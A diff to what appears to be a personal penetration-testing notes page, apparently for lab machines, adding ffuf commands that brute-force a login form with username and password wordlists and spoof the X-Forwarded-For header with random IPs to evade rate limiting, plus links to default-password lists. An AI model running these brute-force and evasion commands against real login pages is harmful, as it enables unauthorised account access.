@@ -1,15 +1,18 @@
+##### Bypass protection
+```bash
+for i in {1..10000}; do echo "$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"; done > random_ips.txt
+```
+
+```bash
+ffuf -w random_ips.txt:IP -H 'X-Forwareded-For: IP'
+```
+
+#### Basic usage
 ````shell
 ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
 ````
 
-#ffuf 
-
-Word list: [[Automated Discovery]]
-#hydra
-
-
 #### Default passwords:
-
 - [https://cirt.net/passwords](https://cirt.net/passwords)
 - https://default-password.info/
 - https://datarecovery.com/rd/default-passwords/
